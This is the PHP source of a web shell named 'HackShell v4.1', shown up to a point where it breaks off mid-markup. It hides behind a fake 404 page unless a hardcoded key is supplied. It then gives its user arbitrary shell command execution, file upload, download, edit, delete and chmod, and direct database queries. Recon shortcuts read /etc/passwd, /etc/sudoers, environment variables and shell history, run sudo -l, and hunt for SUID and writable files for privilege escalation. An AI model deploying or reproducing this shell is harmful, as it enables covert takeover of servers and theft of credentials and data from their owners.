<?php
// ──────────────────────────────────────────────
//  HACKSHELL v4.1  –  fixed edition
// ──────────────────────────────────────────────
$SECRET_KEY = "x4i9z2k7m8n3p6q0r5t1v8w9y2";
error_reporting(0);

if (!isset($_GET['key']) || $_GET['key'] !== $SECRET_KEY) {
    http_response_code(404); echo "<h1>404 - Page Not Found</h1>"; exit;
}

$KEY = $SECRET_KEY;

// ── Helpers ──────────────────────────────────
function sysinfo() {
    return [
        'os'      => php_uname(),
        'php'     => phpversion(),
        'server'  => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'disk'    => round(disk_free_space("/")/(1024**3),2).' GB',
        'user'    => get_current_user(),
        'ulimit'  => ini_get('upload_max_filesize'),
        'postmax' => ini_get('post_max_size'),
        'uploads' => ini_get('file_uploads') ? 'Yes' : 'No',
    ];
}

// ── Current directory (from GET or POST cwd) ──
// POST cwd takes priority (set by terminal after cd)
if (isset($_POST['cwd']) && is_dir($_POST['cwd'])) {
    $dir = realpath($_POST['cwd']);
} elseif (isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if (!$dir || !is_dir($dir)) $dir = getcwd();
} else {
    $dir = getcwd();
}

// ── Command Execution ─────────────────────────
$cmd_result  = null;
$new_cwd     = $dir;   // after command runs, cwd may change (cd)
$cmd_ran     = null;

if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '') {
    $raw_cmd = trim($_POST['cmd']);
    $cmd_ran = $raw_cmd;

    // Detect bare `cd <path>` so we can update the browser dir too
    if (preg_match('/^cd\s+(.+)$/i', $raw_cmd, $m)) {
        $target = trim($m[1]);
        // Resolve relative to current dir
        if ($target === '~') $target = $_SERVER['HOME'] ?? '/root';
        if ($target[0] !== '/') $target = $dir.'/'.$target;
        $resolved = realpath($target);
        if ($resolved && is_dir($resolved)) {
            $new_cwd = $resolved;
            $cmd_result = ""; // cd produces no output
        } else {
            $cmd_result = "bash: cd: $target: No such file or directory";
        }
    } else {
        // Run command in current dir; capture new cwd via pwd trick
        $escaped_dir = escapeshellarg($dir);
        $output = shell_exec("cd $escaped_dir && ".$raw_cmd." 2>&1");
        $cmd_result = ($output === null) ? "(no output)" : $output;

        // If command contains a cd, also capture pwd after
        if (preg_match('/\bcd\b/', $raw_cmd)) {
            $pwd = shell_exec("cd $escaped_dir && ".$raw_cmd." 2>&1; pwd 2>/dev/null");
            // last line is the new pwd
            if ($pwd) {
                $lines = array_filter(explode("\n", trim($pwd)));
                $last = end($lines);
                if ($last && is_dir($last)) $new_cwd = realpath($last);
            }
        }
    }
    // After any command, update $dir to new cwd
    $dir = $new_cwd;
}

// ── Parent dir (safe) ────────────────────────
$parent_dir = ($dir === '/') ? '/' : dirname($dir);

// ── File Upload ───────────────────────────────
$upload_result = null;
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] !== UPLOAD_ERR_NO_FILE) {
    $udir = isset($_POST['upload_dir']) && is_dir($_POST['upload_dir']) ? $_POST['upload_dir'] : $dir;
    $udir = rtrim(realpath($udir),'/').'/';
    $dest = $udir.basename($_FILES['upload_file']['name']);
    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK)
        $upload_result = ['ok'=>false,'msg'=>"Upload error ".$_FILES['upload_file']['error']];
    elseif (!is_writable($udir))
        $upload_result = ['ok'=>false,'msg'=>"Not writable: $udir"];
    elseif (file_exists($dest))
        $upload_result = ['ok'=>false,'msg'=>"File already exists"];
    elseif (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest))
        $upload_result = ['ok'=>true,'msg'=>"Uploaded → $dest"];
    else
        $upload_result = ['ok'=>false,'msg'=>"Move failed"];
}

// ── File Download ─────────────────────────────
if (isset($_GET['dl'])) {
    $f = realpath($_GET['dl']);
    if ($f && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        readfile($f); exit;
    }
}

// ── File Delete ───────────────────────────────
$delete_result = null;
if (isset($_GET['del'])) {
    $f = realpath($_GET['del']);
    if ($f && is_file($f))    { unlink($f); $delete_result = "Deleted: $f"; }
    elseif ($f && is_dir($f)) { rmdir($f);  $delete_result = "Deleted dir: $f"; }
    else $delete_result = "Not found";
}

// ── File Edit ─────────────────────────────────
$edit_file = null; $file_content = null; $edit_result = null;
if (isset($_GET['edit'])) {
    $ef = realpath($_GET['edit']);
    if ($ef && is_file($ef)) { $edit_file = $ef; $file_content = file_get_contents($ef); }
}
if (isset($_POST['save_file'], $_POST['file_content'], $_POST['file_path'])) {
    $fp = realpath($_POST['file_path']);
    if ($fp && is_writable($fp)) {
        file_put_contents($fp, $_POST['file_content']);
        $edit_result = ['ok'=>true,'msg'=>"Saved: $fp"];
    } else {
        $edit_result = ['ok'=>false,'msg'=>"Cannot write: ".($_POST['file_path']??'')];
    }
}

// ── DB Query ──────────────────────────────────
$sql_result = null; $sql_columns = []; $sql_rows = []; $sql_error = null;
if (isset($_POST['sql_query']) && trim($_POST['sql_query']) !== '') {
    $h = $_POST['db_host']??'localhost';
    $u = $_POST['db_user']??'';
    $p = $_POST['db_pass']??'';
    $n = $_POST['db_name']??'';
    try {
        $dsn = $n ? "mysql:host=$h;dbname=$n;charset=utf8mb4" : "mysql:host=$h;charset=utf8mb4";
        $pdo = new PDO($dsn,$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
        $stmt = $pdo->query(trim($_POST['sql_query']));
        if ($stmt) {
            $sql_rows    = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $sql_columns = $sql_rows ? array_keys($sql_rows[0]) : [];
            $sql_result  = count($sql_rows)." row(s) returned";
        } else {
            $sql_result = "Query OK (no result set)";
        }
    } catch (PDOException $e) {
        $sql_error = $e->getMessage();
    }
}

// ── Recon ─────────────────────────────────────
$priv_result = isset($_GET['priv']) ? shell_exec("whoami && id && sudo -l 2>&1") : null;
$env_result  = isset($_GET['env'])  ? shell_exec("env 2>&1") : null;
$net_result  = isset($_GET['net'])  ? shell_exec("(netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null)") : null;
$ps_result   = isset($_GET['ps'])   ? shell_exec("ps aux 2>&1") : null;

// ── Chmod ─────────────────────────────────────
$chmod_result = null;
if (isset($_POST['chmod_path'], $_POST['chmod_mode'])) {
    $cp = realpath($_POST['chmod_path']);
    if ($cp) { chmod($cp, octdec($_POST['chmod_mode'])); $chmod_result = "chmod ".$_POST['chmod_mode']." on $cp"; }
    else $chmod_result = "Path not found";
}

// ── Compress ──────────────────────────────────
$compress_result = null;
if (isset($_POST['compress'], $_POST['compress_path'])) {
    $cp = realpath($_POST['compress_path']);
    if ($cp && file_exists($cp)) {
        $zn = $dir.'/'.basename($cp).'.zip'; $zip = new ZipArchive();
        if ($zip->open($zn, ZipArchive::CREATE)===TRUE) {
            if (is_dir($cp)) {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cp),RecursiveIteratorIterator::SELF_FIRST);
                foreach($it as $f2) { if(is_file($f2)) $zip->addFile((string)$f2,str_replace($cp.'/','',(string)$f2)); }
            } else { $zip->addFile($cp,basename($cp)); }
            $zip->close(); $compress_result = "Created: $zn";
        } else { $compress_result = "ZipArchive open failed"; }
    } else { $compress_result = "Path not found"; }
}

// ── File Browser entries ──────────────────────
$entries = [];
if (is_dir($dir)) {
    foreach (@scandir($dir) as $f) {
        if ($f==='.' || $f==='..') continue;
        $fp = $dir.'/'.$f;
        $entries[] = [
            'name'  => $f,
            'path'  => $fp,
            'isdir' => is_dir($fp),
            'size'  => is_file($fp) ? filesize($fp) : 0,
            'perms' => substr(sprintf('%o',fileperms($fp)),-4),
            'mtime' => date('Y-m-d H:i', filemtime($fp)),
        ];
    }
    usort($entries, fn($a,$b) => $b['isdir'] <=> $a['isdir'] ?: strcmp($a['name'],$b['name']));
}

$sys = sysinfo();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HackShell v4.1</title>
<style>
:root{
  --bg:#080c08; --panel:#0d1210; --border:#1a2a1a; --green:#00ff41;
  --green2:#00cc33; --dim:#2a4a2a; --red:#ff4444; --yellow:#ffcc00;
  --cyan:#00ccff; --text:#bbffbb; --muted:#4a6a4a; --panel2:#101a10;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;font-size:13px}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:#050805}
::-webkit-scrollbar-thumb{background:var(--dim);border-radius:2px}

/* ── Root grid: topbar + (sidebar | main) ── */
#root{display:grid;grid-template-columns:255px 1fr;grid-template-rows:44px 1fr;height:100vh}
#topbar{grid-column:1/-1;background:var(--panel);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:14px;padding:0 14px;overflow:hidden}
#sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;min-height:0}
#main{display:flex;flex-direction:column;overflow:hidden;min-height:0}

/* top bar */
.logo{color:var(--green);font-size:14px;font-weight:bold;letter-spacing:2px;text-shadow:0 0 6px var(--green);white-space:nowrap}
.sysstat{color:var(--muted);font-size:10px;line-height:1.5;overflow:hidden}
.sysstat b{color:var(--green2)}

/* sidebar */
#fb-header{padding:6px 8px;border-bottom:1px solid var(--border);background:var(--panel2);flex-shrink:0}
#fb-path{font-size:10px;color:var(--cyan);word-break:break-all;margin-bottom:4px}
#fb-nav{display:flex;gap:6px}
#fb-back-btn{font-size:10px;color:var(--red);cursor:pointer;padding:2px 6px;border:1px solid #330000;border-radius:2px}
#fb-back-btn:hover{background:#330000}
#fb-goto{flex:1;background:var(--bg);border:1px solid var(--dim);color:var(--text);font-family:inherit;font-size:10px;padding:2px 5px;border-radius:2px;outline:none}
#fb-goto:focus{border-color:var(--green)}
#fb-list{flex:1;overflow-y:auto;padding:2px 0;min-height:0}
.fb-item{display:flex;align-items:center;gap:5px;padding:3px 7px;border-bottom:1px solid #0a110a;cursor:pointer;transition:.08s}
.fb-item:hover{background:var(--panel2)}
.fb-icon{font-size:10px;width:13px;text-align:center;flex-shrink:0}
.fb-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px}
.is-dir .fb-name{color:var(--yellow)}
.is-file .fb-name{color:var(--text)}
.fb-perms{font-size:9px;color:var(--muted);flex-shrink:0}
.fb-acts{display:none;gap:3px;flex-shrink:0}
.fb-item:hover .fb-acts{display:flex}
.fba{font-size:9px;color:var(--muted);cursor:pointer;padding:1px 3px;border:1px solid var(--dim);border-radius:1px}
.fba:hover{color:var(--green);border-color:var(--green)}
.fba.del:hover{color:var(--red);border-color:var(--red)}
#upload-zone{border-top:1px solid var(--border);padding:6px;flex-shrink:0}
#dropzone{border:1px dashed var(--dim);padding:8px;text-align:center;color:var(--muted);font-size:10px;cursor:pointer;border-radius:2px;transition:.15s}
#dropzone:hover,#dropzone.over{border-color:var(--green);color:var(--green)}

/* tabs */
.tabs{display:flex;background:var(--panel2);border-bottom:1px solid var(--border);flex-shrink:0;overflow-x:auto}
.tab{padding:7px 13px;cursor:pointer;color:var(--muted);font-size:11px;white-space:nowrap;border-bottom:2px solid transparent;transition:.1s}
.tab:hover{color:var(--text)}
.tab.active{color:var(--green);border-bottom-color:var(--green)}

/* panels */
.panel{display:none;flex:1;flex-direction:column;min-height:0;overflow:hidden}
.panel.active{display:flex}
.panel-body{flex:1;overflow-y:auto;padding:12px}

/* ── TERMINAL ── */
#terminal-wrap{display:flex;flex-direction:column;flex:1;min-height:0;background:var(--bg)}
#term-hist{flex:1;overflow-y:auto;padding:8px 10px;font-size:12px;line-height:1.5;min-height:0}
.te{}
.te-prompt{color:var(--green2);word-break:break-all}
.te-cmd{color:var(--green)}
.te-out{white-space:pre-wrap;color:var(--text);padding:1px 0 6px 10px;border-left:2px solid var(--dim);margin:2px 0 4px 2px}
.te-out.err{color:#ff6666}
#term-inputbar{display:flex;align-items:center;gap:6px;padding:5px 8px;border-top:2px solid var(--dim);background:var(--panel);flex-shrink:0}
#term-ps1{color:var(--green);font-size:12px;white-space:nowrap;flex-shrink:0}
#term-in{flex:1;background:transparent;border:none;outline:none;color:var(--green);font-family:inherit;font-size:12px;caret-color:var(--green)}
.btn-sm{background:transparent;border:1px solid var(--dim);color:var(--muted);padding:2px 8px;cursor:pointer;font-family:inherit;font-size:11px;border-radius:2px}
.btn-sm:hover{border-color:var(--green);color:var(--green)}
.quickrow{display:flex;flex-wrap:wrap;gap:4px;padding:5px 8px;background:var(--panel);border-top:1px solid var(--border);flex-shrink:0}
.chip{padding:2px 8px;border:1px solid var(--dim);color:var(--muted);cursor:pointer;font-size:10px;border-radius:2px;font-family:inherit;background:transparent}
.chip:hover{border-color:var(--green);color:var(--green)}

/* forms */
.fr{display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap}
.fr label{color:var(--muted);min-width:80px;font-size:11px}
input[type=text],input[type=password],textarea,select{
  background:var(--panel2);color:var(--text);border:1px solid var(--border);
  padding:4px 7px;font-family:inherit;font-size:12px;border-radius:2px;outline:none}
input:focus,textarea:focus{border-color:var(--green)}
textarea{resize:vertical;width:100%}
.btn{background:var(--panel2);color:var(--green);border:1px solid var(--green);
  padding:4px 12px;cursor:pointer;font-family:inherit;font-size:11px;border-radius:2px}
.btn:hover{background:var(--green);color:#000}
.btn.red{border-color:var(--red);color:var(--red)}
.btn.red:hover{background:var(--red);color:#000}
.btn.yel{border-color:var(--yellow);color:var(--yellow)}
.btn.yel:hover{background:var(--yellow);color:#000}
.btn.cyan{border-color:var(--cyan);color:var(--cyan)}
.btn.cyan:hover{background:var(--cyan);color:#000}

/* section header */
.sh{color:var(--green);font-size:11px;letter-spacing:1px;margin-bottom:8px;
  border-bottom:1px solid var(--border);padding-bottom:5px;display:flex;align-items:center;justify-content:space-between}

/* result box */
.rb{background:var(--panel2);border:1px solid var(--border);padding:7px;margin-top:7px;
  white-space:pre-wrap;font-size:11px;max-height:280px;overflow-y:auto;border-radius:2px}
.rb.ok{border-color:var(--green2);color:var(--green)}
.rb.err{border-color:var(--red);color:var(--red)}

/* badge */
.badge{display:inline-block;padding:1px 5px;border-radius:2px;font-size:10px}
.badge.ok{background:#003300;color:var(--green)}
.badge.err{background:#330000;color:var(--red)}

/* sysinfo grid */
.si{display:grid;grid-template-columns:130px 1fr;gap:3px 10px;font-size:11px}
.si-k{color:var(--muted)}
.si-v{color:var(--cyan)}

/* ── DB TABLE with resizable columns ── */
.dbtw{overflow:auto;margin-top:8px;max-height:calc(100vh - 320px);border:1px solid var(--border)}
table.dbt{border-collapse:collapse;font-size:11px;table-layout:fixed;width:max-content;min-width:100%}
table.dbt th{
  background:var(--panel2);color:var(--green);padding:5px 8px;text-align:left;
  border:1px solid var(--border);position:relative;user-select:none;
  white-space:nowrap;min-width:80px
}
table.dbt td{
  padding:4px 8px;border:1px solid var(--border);color:var(--text);
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
  max-width:400px
}
table.dbt td:hover{white-space:normal;word-break:break-all;background:#101a10 !important;position:relative;z-index:2}
table.dbt tr:nth-child(even) td{background:#0b130b}
table.dbt tr:hover td{background:#0f1a0f}
/* column resize handle */
.col-resizer{
  position:absolute;right:0;top:0;bottom:0;width:5px;cursor:col-resize;
  background:transparent;z-index:3
}
.col-resizer:hover,.col-resizer.dragging{background:var(--green)}

/* modal */
#db-modal{display:none;position:fixed;inset:0;background:#000b;z-index:999;align-items:center;justify-content:center}
#db-modal.open{display:flex}
#db-modal-box{background:var(--panel);border:1px solid var(--green);padding:22px;width:360px;border-radius:3px}
#db-modal-box h3{color:var(--green);margin-bottom:12px;font-size:12px;letter-spacing:1px}

/* upload form */
#upload-form{margin:0}
</style>
</head>
<body>
<div id="root">

<!-- TOP BAR -->
<div id="topbar">
  <div class="logo">⬡ HACKSHELL v4.1</div>
  <div class="sysstat">
    <b><?=htmlspecialchars($sys['os'])?></b> &nbsp;│&nbsp;
    PHP <b><?=htmlspecialchars($sys['php'])?></b> &nbsp;│&nbsp;
    User: <b><?=htmlspecialchars($sys['user'])?></b> &nbsp;│&nbsp;
    Disk free: <b><?=htmlspecialchars($sys['disk'])?></b>
  </div>
</div>

<!-- SIDEBAR -->
<div id="sidebar">
  <div id="fb-header">
    <div id="fb-path"><?=htmlspecialchars($dir)?></div>
    <div id="fb-nav">
      <?php
        // Back button: only show/enable if we're not at root
        $at_root = ($dir === $parent_dir || $dir === '/');
      ?>
      <span id="fb-back-btn"
        <?php if($at_root): ?>style="opacity:.3;cursor:default"<?php else: ?>
        onclick="navDir(<?=json_encode($parent_dir)?>)"<?php endif; ?>>▲ ..</span>
      <input id="fb-goto" type="text" value="<?=htmlspecialchars($dir)?>" placeholder="Go to path…"
             onkeydown="if(event.key==='Enter'){navDir(this.value);}">
    </div>
  </div>
  <div id="fb-list">
    <?php foreach($entries as $e): ?>
    <div class="fb-item <?=$e['isdir']?'is-dir':'is-file'?>"
         data-path="<?=htmlspecialchars($e['path'])?>"
         data-dir="<?=(int)$e['isdir']?>"
         onclick="fbClick(this)">
      <span class="fb-icon"><?=$e['isdir']?'▶':'·'?></span>
      <span class="fb-name" title="<?=htmlspecialchars($e['name'])?>"><?=htmlspecialchars($e['name'])?></span>
      <span class="fb-perms"><?=$e['perms']?></span>
      <span class="fb-acts">
        <?php if(!$e['isdir']): ?>
        <span class="fba" onclick="event.stopPropagation();editFile(<?=json_encode($e['path'])?>)">ed</span>
        <span class="fba" onclick="event.stopPropagation();dlFile(<?=json_encode($e['path'])?>)">dl</span>
        <?php endif; ?>
        <span class="fba del" onclick="event.stopPropagation();delFile(<?=json_encode($e['path']),json_encode($e['name'])?>)">rm</span>
      </span>
    </div>
    <?php endforeach; ?>
    <?php if(empty($entries)): ?><div style="padding:8px;color:var(--muted);font-size:11px">(empty)</div><?php endif; ?>
  </div>
  <div id="upload-zone">
    <form id="upload-form" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="cwd" value="<?=htmlspecialchars($dir)?>">
      <input type="hidden" name="upload_dir" value="<?=htmlspecialchars($dir)?>">
      <div id="dropzone" onclick="document.getElementById('ufile').click()">⬆ drop / click to upload</div>
      <input type="file" name="upload_file" id="ufile" style="display:none"
             onchange="document.getElementById('upload-form').submit()">
      <?php if($upload_result): ?>
      <div class="rb <?=$upload_result['ok']?'ok':'err'?>" style="margin-top:5px;max-height:40px"><?=htmlspecialchars($upload_result['msg'])?></div>
      <?php endif; ?>
    </form>
  </div>
</div>

<!-- MAIN -->
<div id="main">
  <div class="tabs">
    <div class="tab active" data-panel="terminal">⬛ Terminal</div>
    <div class="tab" data-panel="database">🗄 Database</div>
    <div class="tab" data-panel="sysinfo">ℹ Sysinfo</div>
    <div class="tab" data-panel="fileops">🔧 File Ops</div>
    <div class="tab" data-panel="network">🌐 Network</div>
    <div class="tab" data-panel="processes">⚙ Processes</div>
    <div class="tab" data-panel="env">🌿 Env</div>
    <div class="tab" data-panel="privesc">🔑 PrivEsc</div>
  </div>

  <!-- TERMINAL -->
  <div class="panel active" id="panel-terminal">
    <div id="terminal-wrap">
      <div id="term-hist">
        <!-- Previous entries from sessionStorage rendered by JS on load -->
        <?php if($cmd_ran !== null): ?>
        <div class="te" id="server-entry">
          <div class="te-prompt"><?=htmlspecialchars($dir)?><span class="te-cmd"> $ <?=htmlspecialchars($cmd_ran)?></span></div>
          <?php if($cmd_result !== ""): ?>
          <div class="te-out"><?=htmlspecialchars($cmd_result)?></div>
          <?php endif; ?>
        </div>
        <?php endif; ?>
      </div>
      <form method="POST" id="term-form">
        <input type="hidden" name="cwd" id="term-cwd" value="<?=htmlspecialchars($dir)?>">
        <div id="term-inputbar">
          <span id="term-ps1"><?=htmlspecialchars($dir)?>$</span>
          <input id="term-in" name="cmd" type="text" autocomplete="off" spellcheck="false"
                 autofocus placeholder="command…">
          <button type="submit" class="btn-sm">↵</button>
        </div>
      </form>
    </div>
    <div class="quickrow">
      <span class="chip" onclick="runQ('whoami')">whoami</span>
      <span class="chip" onclick="runQ('id')">id</span>
      <span class="chip" onclick="runQ('uname -a')">uname</span>
      <span class="chip" onclick="runQ('ls -la')">ls -la</span>
      <span class="chip" onclick="runQ('cat /etc/passwd')">passwd</span>
      <span class="chip" onclick="runQ('cat /etc/hosts')">hosts</span>
      <span class="chip" onclick="runQ('df -h')">df -h</span>
      <span class="chip" onclick="runQ('find / -perm -4000 -type f 2>/dev/null')">SUID</span>
      <span class="chip" onclick="runQ('ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null')">ports</span>
      <span class="chip" onclick="runQ('cat /proc/version')">kernel</span>
      <span class="chip" onclick="runQ('crontab -l 2>/dev/null')">cron</span>
      <span class="chip" onclick="runQ('env')">env</span>
      <span class="chip" onclick="runQ('cat ~/.bash_history 2>/dev/null | tail -30')">history</span>
      <span class="chip" onclick="runQ('ls -la /home/')">homes</span>
    </div>
  </div>

  <!-- DATABASE -->
  <div class="panel" id="panel-database">
    <div class="panel-body">
      <div class="sh">DATABASE ACCESS
        <div style="display:flex;gap:6px;align-items:center">
          <span id="db-badge" class="badge err">No credentials</span>
          <button class="btn" onclick="openDbModal()">✎ Edit Creds</button>
        </div>
      </div>
      <form method="POST" id="db-form">
        <input type="hidden" name="cwd" value="<?=htmlspecialchars($dir)?>">
        <input type="hidden" name="db_host" id="f_h">
        <input type="hidden" name="db_user" id="f_u">
        <input type="hidden" name="db_pass" id="f_p">
        <input type="hidden" name="db_name" id="f_n">
        <div class="quickrow" style="padding:0 0 8px 0">
          <span class="chip" onclick="setSql('SHOW DATABASES;')">SHOW DBS</span>
          <span class="chip" onclick="setSql('SHOW TABLES;')">SHOW TABLES</span>
          <span class="chip" onclick="setSql('SELECT * FROM information_schema.tables LIMIT 100;')">ALL TABLES</span>
          <span class="chip" onclick="setSql('SELECT user,host FROM mysql.user;')">USERS</span>
          <span class="chip" onclick="setSql('SELECT @@version;')">VERSION</span>
          <span class="chip" onclick="setSql('SHOW VARIABLES LIKE \\'%secure%\\';')">SEC VARS</span>
          <span class="chip" onclick="setSql('SELECT table_name,table_rows FROM information_schema.tables WHERE table_schema=DATABASE();')">TABLE SIZES</span>
        </div>
        <textarea name="sql_query" id="sql_ta" rows="5"
          placeholder="SELECT * FROM users;"><?=htmlspecialchars(trim($_POST['sql_query']??''))?></textarea>
        <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
          <button type="submit" class="btn">▶ Execute</button>
          <?php if($sql_columns): ?>
          <button type="button" class="btn cyan" onclick="exportCsv()">⬇ Export CSV</button>
          <span style="color:var(--muted);font-size:11px"><?=htmlspecialchars($sql_result??'')?></span>
          <?php elseif($sql_result): ?>
          <span style="color:var(--green);font-size:11px"><?=htmlspecialchars($sql_result)?></span>
          <?php endif; ?>
        </div>
      </form>

      <?php if($sql_error): ?>
      <div class="rb err">SQL ERROR: <?=htmlspecialchars($sql_error)?></div>
      <?php elseif($sql_columns): ?>
      <div class="dbtw" id="dbtw">
        <table class="dbt" id="dbt">
          <thead><tr>
            <?php foreach($sql_columns as $c): ?>
            <th><?=htmlspecialchars($c)?><span class="col-resizer" onmousedown="startResize(event,this)"></span></th>
            <?php endforeach; ?>
          </tr></thead>
          <tbody>
            <?php foreach($sql_rows as $row): ?>
            <tr><?php foreach($row as $v): ?><td title="<?=htmlspecialchars((string)$v)?>"><?=htmlspecialchars((string)$v)?></td><?php endforeach; ?></tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
      <?php endif; ?>
    </div>
  </div>

  <!-- SYSINFO -->
  <div class="panel" id="panel-sysinfo">
    <div class="panel-body">
      <div class="sh">SYSTEM INFORMATION</div>
      <div class="si">
        <div class="si-k">OS</div><div class="si-v"><?=htmlspecialchars($sys['os'])?></div>
        <div class="si-k">PHP</div><div class="si-v"><?=htmlspecialchars($sys['php'])?></div>
        <div class="si-k">Server</div><div class="si-v"><?=htmlspecialchars($sys['server'])?></div>
        <div class="si-k">Disk Free</div><div class="si-v"><?=htmlspecialchars($sys['disk'])?></div>
        <div class="si-k">User</div><div class="si-v"><?=htmlspecialchars($sys['user'])?></div>
        <div class="si-k">CWD</div><div class="si-v"><?=htmlspecialchars($dir)?></div>
        <div class="si-k">Upload Limit</div><div class="si-v"><?=htmlspecialchars($sys['ulimit'])?></div>
        <div class="si-k">Post Max</div><div class="si-v"><?=htmlspecialchars($sys['postmax'])?></div>
        <div class="si-k">File Uploads</div><div class="si-v"><?=htmlspecialchars($sys['uploads'])?></div>
      </div>
      <div style="margin-top:16px">
        <div class="sh">QUICK RECON</div>
        <div class="quickrow" style="padding:0">
          <a href="?key=<?=$KEY?>&priv=1&dir=<?=urlencode($dir)?>" class="chip">Privileges</a>
          <a href="?key=<?=$KEY?>&env=1&dir=<?=urlencode($dir)?>" class="chip">Env Vars</a>
          <a href="?key=<?=$KEY?>&net=1&dir=<?=urlencode($dir)?>" class="chip">Network</a>
          <a href="?key=<?=$KEY?>&ps=1&dir=<?=urlencode($dir)?>" class="chip">Processes</a>
        </div>
      </div>
    </div>
  </div>

  <!-- FILE OPS -->
  <div class="panel" id="panel-fileops">
    <div class="panel-body">
      <div class="sh">FILE EDITOR</div>
      <?php if($edit_file && $file_content !== null): ?>
      <form method="POST">
        <input type="hidden" name="cwd" value="<?=htmlspecialchars($dir)?>">
        <div style="margin-bottom:5px;color:var(--cyan);font-size:11px">✎ <?=htmlspecialchars($edit_file)?></div>
        <textarea name="file_content" rows="16"><?=htmlspecialchars($file_content)?></textarea>
        <input type="hidden" name="file_path" value="<?=htmlspecialchars($edit_file)?>">
        <div style="margin-top:7px"><button type="submit" name="save_file" value="1" class="btn">💾 Save</button></div>
        <?php if($edit_result): ?><div class="rb <?=$edit_result['ok']?'ok':'err'?>" style="margin-top:5px"><?=htmlspecialchars($edit_result['msg'])?></div><?php endif; ?>
      </form>
      <?php else: ?>
      <div style="color:var(--muted);font-size:11px">Click <b>ed</b> on a file in the sidebar to edit it.</div>
      <?php if($edit_result): ?><div class="rb <?=$edit_result['ok']?'ok':'err'?>" style="margin-top:8px"><?=htmlspecialchars($edit_result['msg'])?></div><?php endif; ?>
      <?php endif; ?>

      <div class="sh" style="margin-top:18px">COMPRESS</div>
      <form method="POST">
        <input type="hidden" name="cwd" value="<?=htmlspecialchars($dir)?>">
        <div class="fr">
          <label>Path</label>
          <input type="text" name="compress_path" style="flex:1" placeholder="<?=htmlspecialchars($dir)?>">
          <button type="submit" name="compress" value="1" class="btn">ZIP</button>
        </div>
        <?php if($compress_result): ?><div class="rb ok"><?=htmlspecialchars($compress_result)?></div><?php endif; ?>
      </form>

      <div class="sh" style="margin-top:18px">CHMOD</div>
      <form method="POST">
        <input type="hidden" name="cwd" value="<?=htmlspecialchars($dir)?>">
        <div class="fr">
          <label>Path</label>
          <input type="text" name="chmod_path" style="flex:1" placeholder="<?=htmlspecialchars($dir)?>">
          <label>Mode</label>
          <input type="text" name="chmod_mode" style="width:55px" placeholder="0755">
          <button type="submit" class="btn">SET</button>
        </div>
        <?php if($chmod_result): ?><div class="rb ok"><?=htmlspecialchars($chmod_result)?></div><?php endif; ?>
      </form>

      <?php if($delete_result): ?>
      <div class="sh" style="margin-top:18px">DELETION</div>
      <div class="rb ok"><?=htmlspecialchars($delete_result)?></div>
      <?php endif; ?>
    </div>
  </div>

  <!-- NETWORK -->
  <div class="panel" id="panel-network">
    <div class="panel-body">
      <div class="sh">NETWORK INTELLIGENCE
        <a href="?key=<?=$KEY?>&net=1&dir=<?=urlencode($dir)?>" class="btn">Refresh</a>
      </div>
      <?php if($net_result): ?><div class="rb"><?=htmlspecialchars($net_result)?></div>
      <?php else: ?><div style="color:var(--muted);font-size:11px">Click Refresh.</div><?php endif; ?>
    </div>
  </div>

  <!-- PROCESSES -->
  <div class="panel" id="panel-processes">
    <div class="panel-body">
      <div class="sh">PROCESS LIST
        <a href="?key=<?=$KEY?>&ps=1&dir=<?=urlencode($dir)?>" class="btn">Refresh</a>
      </div>
      <?php if($ps_result): ?><div class="rb" style="max-height:none"><?=htmlspecialchars($ps_result)?></div>
      <?php else: ?><div style="color:var(--muted);font-size:11px">Click Refresh.</div><?php endif; ?>
    </div>
  </div>

  <!-- ENV -->
  <div class="panel" id="panel-env">
    <div class="panel-body">
      <div class="sh">ENVIRONMENT VARIABLES
        <a href="?key=<?=$KEY?>&env=1&dir=<?=urlencode($dir)?>" class="btn">Refresh</a>
      </div>
      <?php if($env_result): ?><div class="rb" style="max-height:none"><?=htmlspecialchars($env_result)?></div>
      <?php else: ?><div style="color:var(--muted);font-size:11px">Click Refresh.</div><?php endif; ?>
    </div>
  </div>

  <!-- PRIVESC -->
  <div class="panel" id="panel-privesc">
    <div class="panel-body">
      <div class="sh">PRIVILEGE ESCALATION
        <a href="?key=<?=$KEY?>&priv=1&dir=<?=urlencode($dir)?>" class="btn">Run Check</a>
      </div>
      <?php if($priv_result): ?><div class="rb"><?=htmlspecialchars($priv_result)?></div>
      <?php else: ?><div style="color:var(--muted);font-size:11px;margin-bottom:12px">Click "Run Check" to run whoami/id/sudo -l</div><?php endif; ?>
      <div class="sh" style="margin-top:16px">QUICK VECTORS</div>
      <div class="quickrow" style="padding:0">
        <span class="chip" onclick="runQT('find / -perm -4000 -type f 2>/dev/null')">SUID</span>
        <span class="chip" onclick="runQT('cat /etc/sudoers 2>/dev/null')">sudoers</span>
        <span class="chip" onclick="runQT('cat /etc/crontab; ls /etc/cron*')">crontabs</span>
        <span class="chip" onclick="runQT('find / -writable -type f -not -path \\'/proc/*\\' 2>/dev/null | head -50')">writable</span>
